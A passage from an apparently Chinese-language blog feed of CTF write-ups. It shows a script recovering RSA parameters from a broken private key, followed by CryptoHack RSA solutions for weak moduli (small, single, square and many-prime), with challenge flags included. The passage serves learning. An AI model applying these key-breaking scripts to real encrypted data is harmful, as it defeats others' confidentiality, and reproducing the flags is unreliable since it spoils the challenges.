Blog</a></p><p>那么先把内容转为十六进制</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'./pri-break.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">key_64 = <span class="string">''</span>.join(data.split(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>])  <span class="comment">#正常私钥是有“-----END PRIVATE KEY-----”和“-----BEGIN PRIVATE KEY-----”,所以是[1:-1],而此处没有开头，所以是[0:-1]</span></span><br><span class="line">key_num = libnum.s2n(base64.b64decode(key_64))</span><br><span class="line">key_hex = <span class="built_in">hex</span>(key_num)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(key_hex)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">5cf2d493aef1899b6a18b82cc8cfe620e27c302818100e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f764502818100bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c28902818100bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e50281803fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></tbody></table></figure><p>下表是常见的证书参数</p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left"><strong>数据</strong></td><td align="left"><strong>长度</strong></td><td align="left"><strong>名称</strong></td><td align="left"><strong>含义</strong></td></tr><tr><td align="left">30</td><td align="left">1</td><td align="left">标记符</td><td align="left">代表ASN.1结构的开始</td></tr><tr><td align="left">82</td><td align="left">1</td><td align="left">长度类型</td><td align="left">代表后面跟着一个双字节长度</td></tr><tr><td align="left">025b</td><td align="left">2</td><td align="left">长度</td><td align="left">代表后续内容的总长度为603字节</td></tr><tr><td align="left">02</td><td align="left">1</td><td align="left">类型</td><td align="left">代表整型</td></tr><tr><td align="left">01</td><td align="left">1</td><td align="left">长度</td><td align="left">代表1字节</td></tr><tr><td align="left">00</td><td align="left">1</td><td align="left">值</td><td align="left">代表整数0</td></tr><tr><td align="left">02</td><td align="left">1</td><td align="left">类型</td><td align="left">代表整型</td></tr><tr><td align="left">81</td><td align="left">1</td><td align="left">长度类型</td><td align="left">代表后面跟着一个单字节长度</td></tr><tr><td align="left">80</td><td align="left">1</td><td align="left">长度</td><td align="left">代表数据长度为128字节</td></tr><tr><td align="left">…</td><td align="left">128</td><td align="left">值</td><td align="left">数据值1</td></tr><tr><td align="left">…</td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><p>对信息分段后大概可以得到：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">5cf2d493aef1899b6a18b82cc8cfe620e27c3</span><br><span class="line">q (028181)= 00e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span><br><span class="line">dp (028181)= 00bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span><br><span class="line">dq (028181)= 00bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span><br><span class="line">q^(-1) mod p (028180)= 3fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span><br></pre></td></tr></tbody></table></figure><p>flag较短的话就可以直接在模q下解密</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">q = <span class="number">0x00e26146b07b963eacf6c585538c541f190727cc6b82e37920dd676de3106bf29411d27b2bc5090ab7212504e349350f65e699e69930bddad67527e8e448586686da985cc2b58b911ea7b9b5666f54094b38339851c69cbe7a2870726710fdaba0cf07ea3a8065adf3fe9d741976348654ff56ed74f420a237c05d7245cd1f7645</span></span><br><span class="line">dp = <span class="number">0x00bbaa507453b9b653815d1bd79e95277e59228d515965640b878e2ee3821ecec7a2daf713799a2199d72bcfe38c97db5f0e27d662d3ca3abc8acce848a5e392b34ed1a6e22b889fc08ca68c7ee5e52da31cafc5af6bb365aef8845937dcc2304fa9faa23cfd31b6edd2320f3b1d80da9c528f044a5b3bb96e7f14403b6d84c289</span></span><br><span class="line">dq = <span class="number">0x00bbd4ac9b781fa4674ce57c8762f2d54ea5e23eb9a1c36dd877fbfe701d4b03de199f83b5406a0d2aff6440d6f901fe81b54152d51e5d18bb423fd7fbb98f279a92bb429407a002cbe5acafb78b7db5ac64b86294cf6f7497d4ffdfdc667ba3b0ecb68b80f8d1e4f082fd4fbc64989630e61fd12c6df6b9c1fa694e8c5df2d1e5</span></span><br><span class="line">n = <span class="number">0x3fec91f745c465b184793a535992dbb20cf6324d83dc4bcf99f1ce4a8f3e12e7fab760208b93b90b6ffbe7848c43fefbb655d74ae0e7229525dfdbc72f07d8837b690a3b9195ae9474d00d9305c203a19f4bba825262faa0bc6d6cd80c5390485ad8f57437bf028cb29aa6fbaf7bc4cf9d3145b42cc2faa1413d663122018ff9</span></span><br><span class="line">c = <span class="number">6081370370545409218106271903400346695565292992689150366474451604281551878507114813906275593034729563149286993189430514737137534129570304832172520820901940874698337733991868650159489601159238582002010625666203730677577976307606665760650563172302688129824842780090723167480409842707790983962415315804311334507726664838464859751689906850572044873633896253285381878416855505301919877714965930289139921111644393144686543207867970807469735534838601255712764863973853116693691206791007433101433703535127367245739289103650669095061417223994665200039533840922696282929063608853551346533188464573323230476645532002621795338655</span></span><br><span class="line">p = n//q</span><br><span class="line">m = <span class="built_in">pow</span>(c,dq,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'-------------------'</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b'flag{oi!_you_find___what_i_Wa1t_talK_y0n!!!}'</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRYPTOHACK--RSA</title>
      <link href="/2024/01/14/cryptohack/"/>
      <url>/2024/01/14/cryptohack/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cryptohack.org/challenges/rsa/">CryptoHack – RSA challenges</a></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">RSA, first described in 1977, is the most famous public-key cryptosystem. It has two main use-cases:</span><br><span class="line"></span><br><span class="line">Public key encryption enables a user, Alice, to distribute a public key and others can use that public key to encrypt messages to her. Alice can then use her private key to decrypt the messages.</span><br><span class="line">Digital signatures enable Alice to use her private key to "sign" a message. Anyone can use Alice's public key to verify that the signature was created with her corresponding private key, and that the message hasn't been tampered with.</span><br><span class="line">Although RSA's security is based on the difficulty of factoring large composite numbers, in recent years the cryptosystem has received criticism for how easy it is to implement incorrectly. Major flaws have been found in common deployments, the most notorious of these being the ROCA vulnerability which led to Estonia suspending 760,000 national ID cards.</span><br><span class="line"></span><br><span class="line">These challenges introduce you to the many footguns of RSA, and soon see you performing attacks which have caused millions of dollars of damage in the real world.</span><br></pre></td></tr></tbody></table></figure><h1 id="STARTER"><a href="#STARTER" class="headerlink" title="STARTER"></a>STARTER</h1><h2 id="RSA-Starter-1"><a href="#RSA-Starter-1" class="headerlink" title="RSA Starter 1"></a>RSA Starter 1</h2><p><img src="/2024/01/14/cryptohack/image-20240114012246832.png" alt="image-20240114012246832"></p><p>让我们求解 101^17^ mod 22663</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">101</span>,<span class="number">17</span>,<span class="number">22663</span>))</span><br><span class="line"><span class="comment"># 19906</span></span><br></pre></td></tr></tbody></table></figure><h2 id="RSA-Starter-2"><a href="#RSA-Starter-2" class="headerlink" title="RSA Starter 2"></a>RSA Starter 2</h2><p><img src="/2024/01/14/cryptohack/image-20240114012531354.png" alt="image-20240114012531354"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c = 12e = 65537p = 17q = 23求 m </span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">12</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">17</span></span><br><span class="line">q = <span class="number">23</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 301</span></span><br></pre></td></tr></tbody></table></figure><h2 id="RSA-Starter-3"><a href="#RSA-Starter-3" class="headerlink" title="RSA Starter 3"></a>RSA Starter 3</h2><p><img src="/2024/01/14/cryptohack/image-20240114012930009.png" alt="image-20240114012930009"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment"># 882564595536224140639625987659416029426239230804614613279163</span></span><br></pre></td></tr></tbody></table></figure><h2 id="RSA-Starter-4"><a href="#RSA-Starter-4" class="headerlink" title="RSA Starter 4"></a>RSA Starter 4</h2><p><img src="/2024/01/14/cryptohack/image-20240114013145888.png" alt="image-20240114013145888"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># 121832886702415731577073962957377780195510499965398469843281</span></span><br></pre></td></tr></tbody></table></figure><h2 id="RSA-Starter-5"><a href="#RSA-Starter-5" class="headerlink" title="RSA Starter 5"></a>RSA Starter 5</h2><p><img src="/2024/01/14/cryptohack/image-20240114013408254.png" alt="image-20240114013408254"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">c = <span class="number">77578995801157823671636298847186723593814843845525223303932</span></span><br><span class="line">n = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = FactorDB(n)</span><br><span class="line"><span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line"><span class="built_in">print</span>(f.connect())</span><br><span class="line"><span class="built_in">print</span>(f.get_factor_list())</span><br><span class="line">p_q = f.get_factor_list()</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_q:</span><br><span class="line">    phi *= p-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 13371337</span></span><br></pre></td></tr></tbody></table></figure><h2 id="RSA-Starter-6"><a href="#RSA-Starter-6" class="headerlink" title="RSA Starter 6"></a>RSA Starter 6</h2><p><img src="/2024/01/14/cryptohack/image-20240114013913153.png" alt="image-20240114013913153"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">附件 private.txt</span><br><span class="line">N = 15216583654836731327639981224133918855895948374072384050848479908982286890731769486609085918857664046075375253168955058743185664390273058074450390236774324903305663479046566232967297765731625328029814055635316002591227570271271445226094919864475407884459980489638001092788574811554149774028950310695112688723853763743238753349782508121985338746755237819373178699343135091783992299561827389745132880022259873387524273298850340648779897909381979714026837172003953221052431217940632552930880000919436507245150726543040714721553361063311954285289857582079880295199632757829525723874753306371990452491305564061051059885803</span><br><span class="line">d = 11175901210643014262548222473449533091378848269490518850474399681690547281665059317155831692300453197335735728459259392366823302405685389586883670043744683993709123180805154631088513521456979317628012721881537154107239389466063136007337120599915456659758559300673444689263854921332185562706707573660658164991098457874495054854491474065039621922972671588299315846306069845169959451250821044417886630346229021305410340100401530146135418806544340908355106582089082980533651095594192031411679866134256418292249592135441145384466261279428795408721990564658703903787956958168449841491667690491585550160457893350536334242689</span><br></pre></td></tr></tbody></table></figure><p>此处要求使用私钥给   SHA256处理后的crypto{Immut4ble_m3ssag1ng}   加密</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">N = <span class="number">15216583654836731327639981224133918855895948374072384050848479908982286890731769486609085918857664046075375253168955058743185664390273058074450390236774324903305663479046566232967297765731625328029814055635316002591227570271271445226094919864475407884459980489638001092788574811554149774028950310695112688723853763743238753349782508121985338746755237819373178699343135091783992299561827389745132880022259873387524273298850340648779897909381979714026837172003953221052431217940632552930880000919436507245150726543040714721553361063311954285289857582079880295199632757829525723874753306371990452491305564061051059885803</span></span><br><span class="line">d = <span class="number">11175901210643014262548222473449533091378848269490518850474399681690547281665059317155831692300453197335735728459259392366823302405685389586883670043744683993709123180805154631088513521456979317628012721881537154107239389466063136007337120599915456659758559300673444689263854921332185562706707573660658164991098457874495054854491474065039621922972671588299315846306069845169959451250821044417886630346229021305410340100401530146135418806544340908355106582089082980533651095594192031411679866134256418292249592135441145384466261279428795408721990564658703903787956958168449841491667690491585550160457893350536334242689</span></span><br><span class="line">m = <span class="string">b'crypto{Immut4ble_m3ssag1ng}'</span></span><br><span class="line">m = hashlib.sha256(m).digest()</span><br><span class="line">m = bytes_to_long(m)</span><br><span class="line">c = <span class="built_in">pow</span>(m,d,N)</span><br><span class="line"><span class="comment"># 13480738404590090803339831649238454376183189744970683129909766078877706583282422686710545217275797376709672358894231550335007974983458408620258478729775647818876610072903021235573923300070103666940534047644900475773318682585772698155617451477448441198150710420818995347235921111812068656782998168064960965451719491072569057636701190429760047193261886092862024118487826452766513533860734724124228305158914225250488399673645732882077575252662461860972889771112594906884441454355959482925283992539925713424132009768721389828848907099772040836383856524605008942907083490383109757406940540866978237471686296661685839083475</span></span><br></pre></td></tr></tbody></table></figure><h1 id="PRIMES-PART-1"><a href="#PRIMES-PART-1" class="headerlink" title="PRIMES PART 1"></a>PRIMES PART 1</h1><h2 id="Factoring"><a href="#Factoring" class="headerlink" title="Factoring"></a>Factoring</h2><p><img src="/2024/01/14/cryptohack/image-20240114014901934.png" alt="image-20240114014901934"></p><p>分解大数</p><p><img src="/2024/01/14/cryptohack/image-20240114015007389.png" alt="image-20240114015007389"></p> <figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">19704762736204164635843    25889363174021185185929</span><br></pre></td></tr></tbody></table></figure><h2 id="Inferius-Prime"><a href="#Inferius-Prime" class="headerlink" title="Inferius Prime"></a>Inferius Prime</h2><p><img src="/2024/01/14/cryptohack/image-20240114015133106.png" alt="image-20240114015133106"></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, inverse, bytes_to_long, long_to_bytes, GCD</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># n will be 8 * (100 + 100) = 1600 bits strong which is pretty good</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">100</span>)</span><br><span class="line">    q = getPrime(<span class="number">100</span>)</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    <span class="keyword">if</span> d != -<span class="number">1</span> <span class="keyword">and</span> GCD(e, phi) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"XXXXXXXXXXXXXXXXXXXXXXX"</span></span><br><span class="line">pt = bytes_to_long(flag)</span><br><span class="line">ct = <span class="built_in">pow</span>(pt, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"ct = <span class="subst">{ct}</span>"</span>)</span><br><span class="line"></span><br><span class="line">pt = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line">decrypted = long_to_bytes(pt)</span><br><span class="line"><span class="keyword">assert</span> decrypted == flag</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 742449129124467073921545687640895127535705902454369756401331</span><br><span class="line">e = 3</span><br><span class="line">ct = 39207274348578481322317340648475596807303160111338236677373</span><br></pre></td></tr></tbody></table></figure><p>n可直接分解</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">986369682585281993933185289261</span></span><br><span class="line">q = <span class="number">752708788837165590355094155871</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = p * q </span><br><span class="line">c = <span class="number">39207274348578481322317340648475596807303160111338236677373</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'crypto{N33d_b1g_pR1m35}'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Monoprime"><a href="#Monoprime" class="headerlink" title="Monoprime"></a>Monoprime</h2><p><img src="/2024/01/14/cryptohack/image-20240114015735571.png" alt="image-20240114015735571"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591                  </span><br><span class="line">e = 65537</span><br><span class="line">ct = 161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942  </span><br></pre></td></tr></tbody></table></figure><p>题目说只用一个数字</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">n = <span class="number">171731371218065444125482536302245915415603318380280392385291836472299752747934607246477508507827284075763910264995326010251268493630501989810855418416643352631102434317900028697993224868629935657273062472544675693365930943308086634291936846505861203914449338007760990051788980485462592823446469606824421932591</span></span><br><span class="line">c = <span class="number">161367550346730604451454756189028938964941280347662098798775466019463375610700074840105776873791605070092554650190486030367121011578171525759600774739890458414593857709994072516290998135846956596662071379067305011746842247628316996977338024343628757374524136260758515864509435302781735938531030576289086798942</span> </span><br><span class="line">phi = (n-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'crypto{0n3_pr1m3_41n7_pr1m3_l0l}'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Square-Eyes"><a href="#Square-Eyes" class="headerlink" title="Square Eyes"></a>Square Eyes</h2><p><img src="/2024/01/14/cryptohack/image-20240114020057553.png" alt="image-20240114020057553"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597674756728212232134056562716399155080108881105952768189193728827484667349378091100068224404684701674782399200373192433062767622841264055426035349769018117299620554803902490432339600566432246795818167460916180647394169157647245603555692735630862148715428791242764799469896924753470539857080767170052783918273180304835318388177089674231640910337743789750979216202573226794240332797892868276309400253925932223895530714169648116569013581643192341931800785254715083294526325980247219218364118877864892068185905587410977152737936310734712276956663192182487672474651103240004173381041237906849437490609652395748868434296753449</span><br><span class="line">e = 65537</span><br><span class="line">ct = 222502885974182429500948389840563415291534726891354573907329512556439632810921927905220486727807436668035929302442754225952786602492250448020341217733646472982286222338860566076161977786095675944552232391481278782019346283900959677167026636830252067048759720251671811058647569724495547940966885025629807079171218371644528053562232396674283745310132242492367274184667845174514466834132589971388067076980563188513333661165819462428837210575342101036356974189393390097403614434491507672459254969638032776897417674577487775755539964915035731988499983726435005007850876000232292458554577437739427313453671492956668188219600633325930981748162455965093222648173134777571527681591366164711307355510889316052064146089646772869610726671696699221157985834325663661400034831442431209123478778078255846830522226390964119818784903330200488705212765569163495571851459355520398928214206285080883954881888668509262455490889283862560453598662919522224935145694435885396500780651530829377030371611921181207362217397805303962112100190783763061909945889717878397740711340114311597934724670601992737526668932871436226135393872881664511222789565256059138002651403875484920711316522536260604255269532161594824301047729082877262812899724246757871448545439896</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/14/cryptohack/image-20240114020131957.png" alt="image-20240114020131957"></p><p>发现 n = p ^ 2 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">23148667521998097720857168827790771337662483716348435477360567409355026169165934446949809664595523770853897203103759106983985113264049057416908191166720008503275951625738975666019029172377653170602440373579593292576530667773951407647222757756437867216095193174201323278896027294517792607881861855264600525772460745259440301156930943255240915685718552334192230264780355799179037816026330705422484000086542362084006958158550346395941862383925942033730030004606360308379776255436206440529441711859246811586652746028418496020145441513037535475380962562108920699929022900677901988508936509354385660735694568216631382653107</span></span><br><span class="line">n = <span class="number">535860808044009550029177135708168016201451343147313565371014459027743491739422885443084705720731409713775527993719682583669164873806842043288439828071789970694759080842162253955259590552283047728782812946845160334801782088068154453021936721710269050985805054692096738777321796153384024897615594493453068138341203673749514094546000253631902991617197847584519694152122765406982133526594928685232381934742152195861380221224370858128736975959176861651044370378539093990198336298572944512738570839396588590096813217791191895941380464803377602779240663133834952329316862399581950590588006371221334128215409197603236942597674756728212232134056562716399155080108881105952768189193728827484667349378091100068224404684701674782399200373192433062767622841264055426035349769018117299620554803902490432339600566432246795818167460916180647394169157647245603555692735630862148715428791242764799469896924753470539857080767170052783918273180304835318388177089674231640910337743789750979216202573226794240332797892868276309400253925932223895530714169648116569013581643192341931800785254715083294526325980247219218364118877864892068185905587410977152737936310734712276956663192182487672474651103240004173381041237906849437490609652395748868434296753449</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ct = <span class="number">222502885974182429500948389840563415291534726891354573907329512556439632810921927905220486727807436668035929302442754225952786602492250448020341217733646472982286222338860566076161977786095675944552232391481278782019346283900959677167026636830252067048759720251671811058647569724495547940966885025629807079171218371644528053562232396674283745310132242492367274184667845174514466834132589971388067076980563188513333661165819462428837210575342101036356974189393390097403614434491507672459254969638032776897417674577487775755539964915035731988499983726435005007850876000232292458554577437739427313453671492956668188219600633325930981748162455965093222648173134777571527681591366164711307355510889316052064146089646772869610726671696699221157985834325663661400034831442431209123478778078255846830522226390964119818784903330200488705212765569163495571851459355520398928214206285080883954881888668509262455490889283862560453598662919522224935145694435885396500780651530829377030371611921181207362217397805303962112100190783763061909945889717878397740711340114311597934724670601992737526668932871436226135393872881664511222789565256059138002651403875484920711316522536260604255269532161594824301047729082877262812899724246757871448545439896</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*p</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(ct, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b'crypto{squar3_r00t_i5_f4st3r_th4n_f4ct0r1ng!}'</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Manyprime"><a href="#Manyprime" class="headerlink" title="Manyprime"></a>Manyprime</h2><p><img src="/2024/01/14/cryptohack/image-20240114020434557.png" alt="image-20240114020434557"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">n = 580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637</span><br><span class="line">e = 65537</span><br><span class="line">ct = 320721490534624434149993723527322977960556510750628354856260732098109692581338409999983376131354918370047625150454728718467998870322344980985635149656977787964380651868131740312053755501594999166365821315043312308622388016666802478485476059625888033017198083472976011719998333985531756978678758897472845358167730221506573817798467100023754709109274265835201757369829744113233607359526441007577850111228850004361838028842815813724076511058179239339760639518034583306154826603816927757236549096339501503316601078891287408682099750164720032975016814187899399273719181407940397071512493967454225665490162619270814464</span><br></pre></td></tr></tbody></table></figure><p>很多素数推荐FactorDB，可直接列表输出</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"><span class="comment"># pip install factordb-python</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">580642391898843192929563856870897799650883152718761762932292482252152591279871421569162037190419036435041797739880389529593674485555792234900969402019055601781662044515999210032698275981631376651117318677368742867687180140048715627160641771118040372573575479330830092989800730105573700557717146251860588802509310534792310748898504394966263819959963273509119791037525504422606634640173277598774814099540555569257179715908642917355365791447508751401889724095964924513196281345665480688029639999472649549163147599540142367575413885729653166517595719991872223011969856259344396899748662101941230745601719730556631637</span></span><br><span class="line">e = <span 